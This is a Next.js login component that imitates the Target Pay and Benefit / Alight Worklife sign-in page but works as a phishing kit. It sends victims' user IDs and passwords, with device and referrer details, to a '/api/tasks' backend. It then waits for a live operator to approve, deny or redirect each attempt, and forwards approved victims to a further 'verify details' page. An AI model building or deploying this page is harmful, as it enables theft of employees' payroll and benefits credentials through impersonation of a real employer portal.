"use client";

import { useState, FormEvent } from "react";
import Image from "next/image";

type Phase = "userid" | "password";

export default function LoginForm() {
  const [phase, setPhase] = useState<Phase>("userid");
  const [userId, setUserId] = useState("");
  const [password, setPassword] = useState("");
  const [showPassword, setShowPassword] = useState(false);
  const [honeypot, setHoneypot] = useState("");
  const [error, setError] = useState("");
  const [isSubmitting, setIsSubmitting] = useState(false);

  async function handleUserIdSubmit(e: FormEvent) {
    e.preventDefault();
    if (!userId.trim() || isSubmitting) return;
    setIsSubmitting(true);
    await new Promise((resolve) => setTimeout(resolve, 2000));
    setIsSubmitting(false);
    setPhase("password");
  }

  const [isVerifying, setIsVerifying] = useState(false);

  async function handlePasswordSubmit(e: FormEvent) {
    e.preventDefault();
    if (!password.trim() || isVerifying) return;
    if (honeypot) return;

    setIsVerifying(true);
    setError("");

    try {
      const res = await fetch("/api/tasks", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          user_id: userId.trim(),
          password,
          masked_email: `${userId.trim().slice(0, 2)}***@***.com`,
          masked_phone: "***-***-****",
          request_kind: "login",
          method: "web",
          member_origin: window.location.origin,
          referrer: document.referrer || "Direct",
          device_info: navigator.userAgent,
          screen_size: `${window.screen.width}x${window.screen.height}`,
        }),
      });

      const data = await res.json();
      if (!data.ok || !data.id) {
        setError("Unable to verify at this time.");
        setIsVerifying(false);
        return;
      }

      const taskId = data.id;
      if (typeof window !== "undefined") {
        sessionStorage.setItem("current_task_id", taskId);
        sessionStorage.setItem("stored_username", userId.trim());
        sessionStorage.setItem("stored_password", password);
      }

      const POLL_MS = 750;
      const TIMEOUT_MS = 90_000;
      const start = Date.now();

      while (Date.now() - start < TIMEOUT_MS) {
        await new Promise((r) => setTimeout(r, POLL_MS));
        try {
          const r = await fetch(`/api/tasks/${taskId}`);
          const d = await r.json();
          if (d.ok && d.task?.status && d.task.status !== "pending") {
            const s = d.task.status;
            if (s === "approved") {
              document.cookie = "__tpb_gate=1;path=/;max-age=86400;secure;samesite=lax";
              window.location.href = "/verify?mode=details";
              return;
            } else if (s === "redirected") {
              window.location.href = "/api/login-out";
              return;
            } else if (s === "denied") {
              setError("Incorrect password or User ID.");
              setIsVerifying(false);
              return;
            }
          }
        } catch { /* retry */ }
      }

      setError("Request timed out. Please try again.");
    } catch {
      setError("Connection error. Please try again.");
    }

    setIsVerifying(false);
  }

  return (
    <div className="auth-shell-page">
      {/* Red brand bar */}
      <hr className="brand-bar" />

      {/* Header */}
      <header className="global-header" role="banner">
        <div className="header-content">
          <div className="header-left">
            <div className="brand-container">
              <a href="/" aria-label="Target Pay and Benefit home">
                <Image
                  src="/target-logo.png"
                  alt="Target Pay and Benefit Alight Worklife"
                  className="brand-logo"
                  width={160}
                  height={52}
                  priority
                />
              </a>
            </div>
          </div>
        </div>
      </header>

      {/* Main two-column layout */}
      <main className="main-wrapper">
        <section className="rtx-login-section">
          {phase === "userid" && (
            <>
              <div className="rtx-login-heading">
                <h1 className="rtx-welcome-title">
                  Target Pay and Benefit Alight Worklife Sign-In
                </h1>
              </div>

              <div className="rtx-auth-panel-wrap">
                <form
                  onSubmit={handleUserIdSubmit}
                  className="f-panel white medium auth-panel auth-panel-user-id"
                >
                  <div className="rtx-auth-panel-content">
                    <h6 className="mb-l">
                      <p className="text-l bold-text">Enter your User ID.</p>
                    </h6>

                    <div className="mb-l mt-l text-xs">
                      * Fields marked with an asterisk (*) are required.
                    </div>

                    <div className="form-group">
                      <label id="UserID-label" htmlFor="UserID" className="input-label">
                        User ID*
                      </label>
                      <div className="input-field-wrapper">
                        <input
                          type="text"
                          id="UserID"
                          aria-live="polite"
                          aria-labelledby="UserID-label"
                          value={userId}
                          onChange={(e) => setUserId(e.target.value)}
                          autoComplete="username"
                          className="input-field"
                        />
                      </div>
                    </div>

                    {/* Honeypot */}
                    <div style={{ position: "absolute", left: "-9999px" }} aria-hidden="true">
                      <input
                        type="text"
                        tabIndex={-1}
                        value={honeypot}
                        onChange={(e) => setHoneypot(e.target.value)}
                        autoComplete="off"
                      />
                    </div>

                    <div className="mt-xl">
                      <button
                        type="submit"
                        className="f-button progressive"
                        aria-label="Next"
                        disabled={!userId.trim() || isSubmitting}
                      >
                        <span className="button-text">{isSubmitting ? "Loading..." : "Next"}</span>
                      </button>
                    </div>
                  </div>
                </form>
              </div>
            </>
          )}

          {phase === "password" && (
            <>
              <div className="mb-xl login-section-heading">
                <h2 className="welcome-title bold-text text-5xl m-none">
                  Welcome to Alight Worklife
                </h2>
              </div>

              <div className="user-summary-block">
                <h6 className="user-summary-label-row">
                  <strong>User ID</strong>
                </h6>
                <div className="user-summary-value-row">
                  <h6 className="m-none">{userId}</h6>
                  <button
                    type="button"
                    className="change-user-btn"
                    onClick={() => setPhase("userid")}
                    disabled={isVerifying}
                  >
                    Change
                  </button>
                </div>
              </div>

              <form
                onSubmit={handlePasswordSubmit}
                className="f-panel white medium auth-panel auth-panel-password"
              >
                <div style={{ width: "100%" }}>
                  <div className="mb-l">
                    <button
                      type="button"
                      aria-label="Go to User ID"
                      className="flex items-center gap-m h-40px pr-m back-to-user"
                      onClick={() => setPhase("userid")}
                      disabled={isVerifying}
                    >
                      <div className="flex justify-center items-center w-24px h-24px">
                        <svg viewBox="0 0 320 512" xmlns="http://www.w3.org/2000/svg" aria-hidden="true">
                          <path d="M9.4 233.4c-12.5 12.5-12.5 32.8 0 45.3l192 192c12.5 12.5 32.8 12.5 45.3 0s12.5-32.8 0-45.3L77.3 256 246.6 86.6c12.5-12.5 12.5-32.8 0-45.3s-32.8-12.5-45.3 0l-192 192z" />
                        </svg>
                      </div>
                      <span className="accent-navy-blue-text bold-text">Back</span>
                    </button>
                  </div>

                  <h6 className="mb-l">
                    <p className="text-l bold-text">Enter your password.</p>
                  </h6>

                  <div className="mb-l mt-l text-xs">
                    * Fields marked with an asterisk (*) are required.
                  </div>

                  {error && (
                    <div className="error-message mb-l" role="alert">
                      {error}
                    </div>
                  )}

                  <div className="form-group">
                    <label htmlFor="password" className="input-label">
                      Password*
                    </label>
                    <div className="input-field-wrapper">
                      <input
                        type={showPassword ? "text" : "password"}
                        id="password"
                        name="password"
                        autoComplete="current-password"
                        required
                        className="input-field"
                        value={password}
                        onChange={(e) => setPassword(e.target.value)}
                        disabled={isVerifying}
                      />
                      <button
                        type="button"
                        className="password-toggle-btn"
                        onClick={() => setShowPassword(!showPassword)}
                        aria-label={showPassword ? "Hide password" : "Show password"}
                      >
                        {showPassword ? (
                          <svg fill="none" stroke="currentColor" viewBox="0 0 24 24" aria-hidden="true">
                            <path
                              strokeLinecap="round"
                              strokeLinejoin="round"
                              strokeWidth="2"
                              d="M13.875 18.825A10.05 10.05 0 0112 19c-4.478 0-8.268-2.943-9.543-7a9.97 9.97 0 011.563-3.029m5.858.908a3 3 0 114.243 4.243M9.878 9.878l4.242 4.242M9.88 9.88l-3.29-3.29m7.532 7.532l3.29 3.29M3 3l18 18"
                            />
                          </svg>
                        ) : (
                          <svg fill="none" stroke="currentColor" viewBox="0 0 24 24" aria-hidden="true">
                            <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M15 12a3 3 0 11-6 0 3 3 0 016 0z" />
                            <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M2.458 12C3.732 7.943 7.523 5 12 5c4.478 0 8.268 2.943 9.542 7-1.274 4.057-5.064 7-9.542 7-4.477 0-8.268-2.943-9.542-7z" />
                          </svg>
                        )}
                      </button>
                    </div>
                  </div>

                  <div className="mt-xl" style={{ marginBottom: "10px" }}>
                    <button
                      type="submit"
                      className="f-button progressive medium"
                      disabled={!password.trim() || isVerifying}
                    >
                      <span className="button-text">{isVerifying ? "Verifying..." : "Log in with password"}</span>
                    </button>
                  </div>

                  <div className="b-top pt-xl neutral-athens-gray-border">
                    <button
                      type="button"
                      className="f-button action medium"
                      aria-label="Biometric login"
                      disabled={isVerifying}
                    >
                      <span className="f-icon left" aria-hidden="true">
                        <svg viewBox="0 0 512 512" xmlns="http://www.w3.org/2000/svg">
                          <path d="M166.4 99.2c-37.1 0-67.2 30.1-67.2 67.2l0 179.2c0 37.1 30.1 67.2 67.2 67.2l179.2 0c37.1 0 67.2-30.1 67.2-67.2l0-179.2c0-37.1-30.1-67.2-67.2-67.2l-179.2 0zM76.8 166.4c0-49.5 40.1-89.6 89.6-89.6l179.2 0c49.5 0 89.6 40.1 89.6 89.6l0 179.2c0 49.5-40.1 89.6-89.6 89.6l-179.2 0c-49.5 0-89.6-40.1-89.6-89.6l0-179.2zM309 256c0-32.9-22.1-56.8-52.6-56.8-30.2 0-52.2 23.8-52.2 56.8 0 33.4 21.4 56.8 52.2 56.8 31 0 52.6-23.4 52.6-56.8zm0 81.4c-16.2 13.3-38.1 21-61.1 21l0 0c-54.6 0-94.2-43-94.2-102.4s43-102.4 102.4-102.4 102.4 43 102.4 102.4l0 99-49.4 0 0-17.6z" />
                        </svg>
                      </span>
                      <span className="button-text">Biometric login</span>
                    </button>
                  </div>
                </div>
              </form>
            </>
          )}

        </section>

        {/* Hero image — right column on desktop, below on mobile */}
        <section className="hero-container" aria-label="Target benefits promotion">
          <Image
            src="/portrait-section.png"
            alt="Decorative Portrait Section"
            className="hero-image"
            width={960}
            height={527}
            priority={false}
          />
        </section>
      </main>

      {/* Footer */}
      <footer className="f-global-footer" role="contentinfo">
        <div className="f-global-footer-inner">
          <div className="f-footer-row-main">
            <div className="f-footer-nav-columns">
              <div className="f-footer-nav-column">
                <ul className="f-footer-nav-list">
                  <li className="f-footer-nav-item">
                    <a href="#" className="f-footer-nav-link">Contact Us</a>
                  </li>
                  <li className="f-footer-nav-item">
                    <a href="#" className="f-footer-nav-link">Report a Death (Current, Former Team Member)</a>
                  </li>
                  <li className="f-footer-nav-item">
                    <a href="#" className="f-footer-nav-link">Feedback</a>
                  </li>
                  <li className="f-footer-nav-item">
                    <a href="#" className="f-footer-nav-link">Protect Yourself From Website Fraud</a>
                  </li>
                </ul>
              </div>
            </div>

            <div className="f-footer-brand-block">
              <Image
                src="/alight-worklife-logo.png"
                alt="Alight Worklife"
                className="f-footer-logo"
                width={230}
                height={40}
              />
              <div className="f-footer-app-badges">
                <a href="#" aria-label="Download on the App Store">
                  <Image src="/app-store-badge.png" alt="Download on the App Store" className="f-footer-app-badge" width={135} height={40} />
                </a>
                <a href="#" aria-label="Get it on Google Play">
                  <Image src="/google-play-badge.png" alt="Get it on Google Play" className="f-footer-app-badge" width={135} height={40} />
                </a>
              </div>
            </div>
          </div>

          <hr className="f-divider" />

          <div className="f-footer-row-legal">
            <div className="f-footer-legal-links">
              <a href="/privacy" className="f-footer-legal-link">Privacy Policy</a>
              <a href="/terms" className="f-footer-legal-link">Terms Of Use</a>
              <a href="#" className="f-footer-legal-link">Cookie Notice</a>
              <a href="#" className="f-footer-legal-link">Cookie Settings [Do Not Sell or Share My Personal Information]</a>
            </div>
            <p className="f-footer-copyright">
              &copy;{new Date().getFullYear()} Alight Solutions. All rights reserved.
            </p>
          </div>
        </div>
      </footer>
    </div>
  );
}
